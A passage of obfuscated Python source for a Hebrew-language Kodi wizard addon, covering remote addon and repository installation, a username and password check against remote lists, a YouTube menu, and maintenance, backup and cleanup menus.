			O000OOO0OO0O00000 =wiz .openURL (O00O0000OO0O00O0O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2493
			OOO0O0O0OO0000O00 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO0OOOO000OOO000O ).findall (O000OOO0OO0O00000 )#line:2494
			if len (OOO0O0O0OO0000O00 )>0 :#line:2495
				for O0O000OOO0OOO0O00 ,O00O0000OO0O00O0O ,OO000000000000OO0 ,O0O000O00OO0OOOO0 ,OO0OO00OO00O000OO ,OO0OO0OO0000O0O00 ,OO0OOOOOOOO0O000O ,OOOOO0O00OOO0O000 ,O0000OO00O0O00OOO in OOO0O0O0OO0000O00 :#line:2496
					if os .path .exists (os .path .join (ADDONS ,OO0OOOO000OOO000O )):#line:2497
						O0OO000O0OOO0O0OO =['Launch Addon','Remove Addon']#line:2498
						OOO0OO0O00000OO00 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O0OO000O0OOO0O0OO )#line:2499
						if OOO0OO0O00000OO00 ==0 :#line:2500
							wiz .ebi ('RunAddon(%s)'%OO0OOOO000OOO000O )#line:2501
							xbmc .sleep (1000 )#line:2502
							return True #line:2503
						elif OOO0OO0O00000OO00 ==1 :#line:2504
							wiz .cleanHouse (os .path .join (ADDONS ,OO0OOOO000OOO000O ))#line:2505
							try :wiz .removeFolder (os .path .join (ADDONS ,OO0OOOO000OOO000O ))#line:2506
							except :pass #line:2507
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO0OOOO000OOO000O ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2508
								removeAddonData (OO0OOOO000OOO000O )#line:2509
							wiz .refresh ()#line:2510
							return True #line:2511
						else :#line:2512
							return False #line:2513
					OO000OOOOO0O0O00O =os .path .join (ADDONS ,OO000000000000OO0 )#line:2514
					if not OO000000000000OO0 .lower ()=='none'and not os .path .exists (OO000OOOOO0O0O00O ):#line:2515
						wiz .log ("Repository not installed, installing it")#line:2516
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OO0OOOO000OOO000O ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO000000000000OO0 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2517
							OOO0O00O0O0O00O00 =wiz .parseDOM (wiz .openURL (O0O000O00OO0OOOO0 ),'addon',ret ='version',attrs ={'id':OO000000000000OO0 })#line:2518
							if len (OOO0O00O0O0O00O00 )>0 :#line:2519
								OO0O0O0OO00OOOOO0 ='%s%s-%s.zip'%(OO0OO00OO00O000OO ,OO000000000000OO0 ,OOO0O00O0O0O00O00 [0 ])#line:2520
								wiz .log (OO0O0O0OO00OOOOO0 )#line:2521
								if KODIV >=17 :wiz .addonDatabase (OO000000000000OO0 ,1 )#line:2522
								installAddon (OO000000000000OO0 ,OO0O0O0OO00OOOOO0 )#line:2523
								wiz .ebi ('UpdateAddonRepos()')#line:2524
								wiz .log ("Installing Addon from Kodi")#line:2526
								OO0O0000O0OOOO0OO =installFromKodi (OO0OOOO000OOO000O )#line:2527
								wiz .log ("Install from Kodi: %s"%OO0O0000O0OOOO0OO )#line:2528
								if OO0O0000O0OOOO0OO :#line:2529
									wiz .refresh ()#line:2530
									return True #line:2531
							else :#line:2532
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OO000000000000OO0 )#line:2533
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OO0OOOO000OOO000O ,OO000000000000OO0 ))#line:2534
					elif OO000000000000OO0 .lower ()=='none':#line:2535
						wiz .log ("No repository, installing addon")#line:2536
						OOOOOOO00000O000O =OO0OOOO000OOO000O #line:2537
						OOOOO000OO0OO000O =O00O0000OO0O00O0O #line:2538
						installAddon (OO0OOOO000OOO000O ,O00O0000OO0O00O0O )#line:2539
						wiz .refresh ()#line:2540
						return True #line:2541
					else :#line:2542
						wiz .log ("Repository installed, installing addon")#line:2543
						OO0O0000O0OOOO0OO =installFromKodi (OO0OOOO000OOO000O ,False )#line:2544
						if OO0O0000O0OOOO0OO :#line:2545
							wiz .refresh ()#line:2546
							return True #line:2547
					if os .path .exists (os .path .join (ADDONS ,OO0OOOO000OOO000O )):return True #line:2548
					OO00O0000OOOOOOOO =wiz .parseDOM (wiz .openURL (O0O000O00OO0OOOO0 ),'addon',ret ='version',attrs ={'id':OO0OOOO000OOO000O })#line:2549
					if len (OO00O0000OOOOOOOO )>0 :#line:2550
						O00O0000OO0O00O0O ="%s%s-%s.zip"%(O00O0000OO0O00O0O ,OO0OOOO000OOO000O ,OO00O0000OOOOOOOO [0 ])#line:2551
						wiz .log (str (O00O0000OO0O00O0O ))#line:2552
						if KODIV >=17 :wiz .addonDatabase (OO0OOOO000OOO000O ,1 )#line:2553
						installAddon (OO0OOOO000OOO000O ,O00O0000OO0O00O0O )#line:2554
						wiz .refresh ()#line:2555
					else :#line:2556
						wiz .log ("no match");return False #line:2557
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2558
		else :wiz .log ("[Addon Installer] Text File: %s"%O000000O00O0O0OO0 )#line:2559
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2560
def installFromKodi (O000O0OO0O0OO000O ,over =True ):#line:2562
	if over ==True :#line:2563
		xbmc .sleep (2000 )#line:2564
	wiz .ebi ('RunPlugin(plugin://%s)'%O000O0OO0O0OO000O )#line:2566
	if not wiz .whileWindow ('yesnodialog'):#line:2567
		return False #line:2568
	xbmc .sleep (1000 )#line:2569
	if wiz .whileWindow ('okdialog'):#line:2570
		return False #line:2571
	wiz .whileWindow ('progressdialog')#line:2572
	if os .path .exists (os .path .join (ADDONS ,O000O0OO0O0OO000O )):return True #line:2573
	else :return False #line:2574
def installAddon (OOOOOO000O0OOOO00 ,OO0O000OOOO00O0O0 ):#line:2576
	if not wiz .workingURL (OO0O000OOOO00O0O0 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OOOOOO000O0OOOO00 ,COLOR2 ));return #line:2577
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2578
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO000O0OOOO00 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2579
	O00OO0O0O000O0O00 =OO0O000OOOO00O0O0 .split ('/')#line:2580
	O0OO000OO0OOOO000 =os .path .join (PACKAGES ,O00OO0O0O000O0O00 [-1 ])#line:2581
	try :os .remove (O0OO000OO0OOOO000 )#line:2582
	except :pass #line:2583
	downloader .download (OO0O000OOOO00O0O0 ,O0OO000OO0OOOO000 ,DP )#line:2584
	OOOO0OOOOO0OO000O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO000O0OOOO00 )#line:2585
	DP .update (0 ,OOOO0OOOOO0OO000O ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2586
	OO00O00OOO000O000 ,O00OO00OO0OO0000O ,OOOO0O0OO0000OOOO =extract .all (O0OO000OO0OOOO000 ,ADDONS ,DP ,title =OOOO0OOOOO0OO000O )#line:2587
	DP .update (0 ,OOOO0OOOOO0OO000O ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2588
	installed (OOOOOO000O0OOOO00 )#line:2589
	installDep (OOOOOO000O0OOOO00 ,DP )#line:2590
	DP .close ()#line:2591
	wiz .ebi ('UpdateAddonRepos()')#line:2592
	wiz .ebi ('UpdateLocalAddons()')#line:2593
	wiz .refresh ()#line:2594
def installDep (O0000O00OOOOOO0O0 ,DP =None ):#line:2596
	O0O0000OO0OO00O0O =os .path .join (ADDONS ,O0000O00OOOOOO0O0 ,'addon.xml')#line:2597
	if os .path .exists (O0O0000OO0OO00O0O ):#line:2598
		OOOOO0OO0OOO0OOO0 =open (O0O0000OO0OO00O0O ,mode ='r');OOOOO00OOO0OOO000 =OOOOO0OO0OOO0OOO0 .read ();OOOOO0OO0OOO0OOO0 .close ();#line:2599
		O0OOO0OOOO00OO00O =wiz .parseDOM (OOOOO00OOO0OOO000 ,'import',ret ='addon')#line:2600
		for OO0O0O0OOO0O0O000 in O0OOO0OOOO00OO00O :#line:2601
			if not 'xbmc.python'in OO0O0O0OOO0O0O000 :#line:2602
				if not DP ==None :#line:2603
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O0O0OOO0O0O000 ))#line:2604
				wiz .createTemp (OO0O0O0OOO0O0O000 )#line:2605
def installed (OOO0000000OO0OO00 ):#line:2632
	OO0000OO0OOO0OOOO =os .path .join (ADDONS ,OOO0000000OO0OO00 ,'addon.xml')#line:2633
	if os .path .exists (OO0000OO0OOO0OOOO ):#line:2634
		try :#line:2635
			O0O000OOOOOOOO0O0 =open (OO0000OO0OOO0OOOO ,mode ='r');O00000OOO0000OO0O =O0O000OOOOOOOO0O0 .read ();O0O000OOOOOOOO0O0 .close ()#line:2636
			OOO0000000OOOOOOO =wiz .parseDOM (O00000OOO0000OO0O ,'addon',ret ='name',attrs ={'id':OOO0000000OO0OO00 })#line:2637
			O000000OOO0O000OO =os .path .join (ADDONS ,OOO0000000OO0OO00 ,'icon.png')#line:2638
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0000000OOOOOOO [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O000000OOO0O000OO )#line:2639
		except :pass #line:2640
def youtubeMenu (url =None ):#line:2642
	if not YOUTUBEFILE =='http://':#line:2643
		if url ==None :#line:2644
			OO0OO0OO0OOO0O0O0 =wiz .workingURL (YOUTUBEFILE )#line:2645
			OO0OO0O0OOO0O00O0 =uservar .YOUTUBEFILE #line:2646
		else :#line:2647
			OO0OO0OO0OOO0O0O0 =wiz .workingURL (url )#line:2648
			OO0OO0O0OOO0O00O0 =url #line:2649
		if OO0OO0OO0OOO0O0O0 ==True :#line:2650
			O00O0O0O00O000O0O =wiz .openURL (OO0OO0O0OOO0O00O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2651
			OOOOO0O00O0OOO0O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00O0O0O00O000O0O )#line:2652
			if len (OOOOO0O00O0OOO0O0 )>0 :#line:2653
				for OO0O00OO00O000OOO ,OO0O0O00OO000O00O ,url ,O0O0000OOO000OOO0 ,OOO000000O0O0OO0O ,OO0000O0OOO0OOO0O in OOOOO0O00O0OOO0O0 :#line:2654
					if OO0O0O00OO000O00O .lower ()=="yes":#line:2655
						addDir ("[B]%s[/B]"%OO0O00OO00O000OOO ,'youtube',url ,description =OO0000O0OOO0OOO0O ,icon =O0O0000OOO000OOO0 ,fanart =OOO000000O0O0OO0O ,themeit =THEME3 )#line:2656
					else :#line:2657
						addFile (OO0O00OO00O000OOO ,'viewVideo',url =url ,description =OO0000O0OOO0OOO0O ,icon =O0O0000OOO000OOO0 ,fanart =OOO000000O0O0OO0O ,themeit =THEME2 )#line:2658
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2659
		else :#line:2660
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2661
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2662
			addFile ('%s'%OO0OO0OO0OOO0O0O0 ,'',themeit =THEME3 )#line:2663
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2664
	setView ('files','viewType')#line:2665
def STARTP ():#line:2666
	OOO00OO0O0OO0OOOO =(ADDON .getSetting ("pass"))#line:2667
	if BUILDNAME =="":#line:2668
	 if not NOTIFY =='true':#line:2669
          O00O0O0OOOO0OO000 =wiz .workingURL (NOTIFICATION )#line:2670
	 if not NOTIFY2 =='true':#line:2671
          O00O0O0OOOO0OO000 =wiz .workingURL (NOTIFICATION2 )#line:2672
	 if not NOTIFY3 =='true':#line:2673
          O00O0O0OOOO0OO000 =wiz .workingURL (NOTIFICATION3 )#line:2674
	OO000OOO00000OOOO =OOO00OO0O0OO0OOOO #line:2675
	O00O0O0OOOO0OO000 =urllib2 .Request (SPEED )#line:2676
	OO000000O000O00O0 =urllib2 .urlopen (O00O0O0OOOO0OO000 )#line:2677
	OO0OOOOO0O0OOO0O0 =OO000000O000O00O0 .readlines ()#line:2679
	O000OOO0000OOOO0O =0 #line:2683
	for OOO0000OOO00OO00O in OO0OOOOO0O0OOO0O0 :#line:2684
		if OOO0000OOO00OO00O .split (' ==')[0 ]==OOO00OO0O0OO0OOOO or OOO0000OOO00OO00O .split ()[0 ]==OOO00OO0O0OO0OOOO :#line:2685
			O000OOO0000OOOO0O =1 #line:2686
			break #line:2687
	if O000OOO0000OOOO0O ==0 :#line:2688
					OO000O0OOOOO0000O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2689
					if OO000O0OOOOO0000O :#line:2691
						ADDON .openSettings ()#line:2693
						sys .exit ()#line:2695
					else :#line:2696
						sys .exit ()#line:2697
	return 'ok'#line:2701
def STARTP2 ():#line:2702
	OOO0O0O00O00OOOO0 =(ADDON .getSetting ("user"))#line:2703
	OOOOO00OOOO000O00 =(UNAME )#line:2705
	OO0O0OO000O000OOO =urllib2 .urlopen (OOOOO00OOOO000O00 )#line:2706
	O0O0000OOOO0O0O00 =OO0O0OO000O000OOO .readlines ()#line:2707
	OO0OO0O00OOO0OOO0 =0 #line:2708
	for O000OOOOOO0O0O000 in O0O0000OOOO0O0O00 :#line:2711
		if O000OOOOOO0O0O000 .split (' ==')[0 ]==OOO0O0O00O00OOOO0 or O000OOOOOO0O0O000 .split ()[0 ]==OOO0O0O00O00OOOO0 :#line:2712
			OO0OO0O00OOO0OOO0 =1 #line:2713
			break #line:2714
	if OO0OO0O00OOO0OOO0 ==0 :#line:2715
		O0O00OO0O000O00OO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2716
		if O0O00OO0O000O00OO :#line:2718
			ADDON .openSettings ()#line:2720
			sys .exit ()#line:2723
		else :#line:2724
			sys .exit ()#line:2725
	return 'ok'#line:2729
def passandpin ():#line:2730
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2731
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2732
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2733
def passandUsername ():#line:2734
	ADDON .openSettings ()#line:2735
def folderback ():#line:2738
    OO000O0O0O0O0O000 =ADDON .getSetting ("path")#line:2739
    if OO000O0O0O0O0O000 :#line:2740
      OO000O0O0O0O0O000 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2741
      ADDON .setSetting ("path",OO000O0O0O0O0O000 )#line:2742
def backmyupbuild ():#line:2745
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2749
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2750
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2751
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2753
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2754
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2755
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2757
def maintMenu (view =None ):#line:2761
	OO00O0O0OO0O0O00O ='[B][COLOR green]ON[/COLOR][/B]';OO0O00000O0000O00 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2763
	O0OO0OOOO000OO0O0 ='true'if AUTOCLEANUP =='true'else 'false'#line:2764
	OOOO0OOOO0OO000OO ='true'if AUTOCACHE =='true'else 'false'#line:2765
	OOOO00OO000O0OOOO ='true'if AUTOPACKAGES =='true'else 'false'#line:2766
	O0O0OOO0OO000O0OO ='true'if AUTOTHUMBS =='true'else 'false'#line:2767
	O00OOO00O0O0O00O0 ='true'if SHOWMAINT =='true'else 'false'#line:2768
	OOOO00O0O0000O0OO ='true'if INCLUDEVIDEO =='true'else 'false'#line:2769
	OOO0O0OOO0O00O0OO ='true'if INCLUDEALL =='true'else 'false'#line:2770
	O0O00O0O00OO00OO0 ='true'if THIRDPARTY =='true'else 'false'#line:2771
	if wiz .Grab_Log (True )==False :O0OO0OOO0O00O00OO =0 #line:2772
	else :O0OO0OOO0O00O00OO =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2773
	if wiz .Grab_Log (True ,True )==False :OOO0OOO0OO0000OO0 =0 #line:2774
	else :OOO0OOO0OO0000OO0 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2775
	O00OO0000O0000O0O =int (O0OO0OOO0O00O00OO )+int (OOO0OOO0OO0000OO0 )#line:2776
	OO0000O00O00O00OO =str (O00OO0000O0000O0O )+' Error(s) Found'if O00OO0000O0000O0O >0 else 'None Found'#line:2777
	O0OOOOO0OOOO0O000 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2778
	if OOO0O0OOO0O00O0OO =='true':#line:2779
		OO0000O0O0O00O0OO ='true'#line:2780
		OOO000OOO0OOOOO0O ='true'#line:2781
		O0OOO0OOO00000OOO ='true'#line:2782
		OOOO000OO0OOOOOO0 ='true'#line:2783
		O0000OO000000O0OO ='true'#line:2784
		O00OOOOO00OO000O0 ='true'#line:2785
		O000OOO0OO0O00O00 ='true'#line:2786
		O0O0O0O00O0O0OO00 ='true'#line:2787
	else :#line:2788
		OO0000O0O0O00O0OO ='true'if INCLUDEBOB =='true'else 'false'#line:2789
		OOO000OOO0OOOOO0O ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2790
		O0OOO0OOO00000OOO ='true'if INCLUDESPECTO =='true'else 'false'#line:2791
		OOOO000OO0OOOOOO0 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2792
		O0000OO000000O0OO ='true'if INCLUDEEXODUS =='true'else 'false'#line:2793
		O00OOOOO00OO000O0 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2794
		O000OOO0OO0O00O00 ='true'if INCLUDESALTS =='true'else 'false'#line:2795
		O0O0O0O00O0O0OO00 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2796
	O00OO00O0000O0OO0 =wiz .getSize (PACKAGES )#line:2797
	O00OOOOO000O000O0 =wiz .getSize (THUMBS )#line:2798
	O0OOO000OOO000O00 =wiz .getCacheSize ()#line:2799
	OO0OO0O000OOO0O0O =O00OO00O0000O0OO0 +O00OOOOO000O000O0 +O0OOO000OOO000O00 #line:2800
	OOOOO0OO0OO0O0O00 =['Daily','Always','3 Days','Weekly']#line:2801
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2802
	if view =="clean"or SHOWMAINT =='true':#line:2803
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0OO0O000OOO0O0O ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2804
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OOO000OOO000O00 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2805
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00OO00O0000O0OO0 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2806
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00OOOOO000O000O0 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2807
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2808
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2809
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2810
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2811
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2812
	if view =="addon"or SHOWMAINT =='false':#line:2813
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2814
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2815
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2816
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2817
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2818
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2819
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2820
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2821
	if view =="misc"or SHOWMAINT =='true':#line:2822
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2823
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2824
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2825
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2826
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2827
		addFile ('View Errors in Log: %s'%(OO0000O00O00O00OO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2828
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2829
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2830
		addFile ('Clear Wizard Log File%s'%O0OOOOO0OOOO0O000 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2831
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2832
	if view =="backup"or SHOWMAINT =='true':#line:2833
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2835
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2837
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2845
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2846
	if view =="tweaks"or SHOWMAINT =='true':#line:2847
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2848
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		else :#line:2850
			if os .path .exists (ADVANCED ):#line:2851
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2852
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2853
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2860
	addFile ('Show All Maintenance: %s'%O00OOO00O0O0O00O0 .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2861
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2862
	addFile ('Third Party Wizards: %s'%O0O00O0O00OO00OO0 .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2863
	if O0O00O0O00OO00OO0 =='true':#line:2864
		O00000OO00O0000OO =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2865
		O0O0OOOOO0O0OO0OO =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2866
		OO0O00O0OOOOOO0OO =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2867
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00000OO00O0000OO ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O0OOOOO0O0OO0OO ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O00O0OOOOOO0OO ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2870
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2871
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O0OO0OOOO000OO0O0 .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2872
	if O0OO0OOOO000OO0O0 =='true':#line:2873
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OOOOO0OO0OO0O0O00 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2874
		addFile ('--- ניקוי קאש בהפעלה: %s'%OOOO0OOOO0OO000OO .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2875
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OOOO00OO000O0OOOO .replace ('true',OO00O0O0OO0O0O00O ).replace ('false',OO0O00000O0000O00 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2876
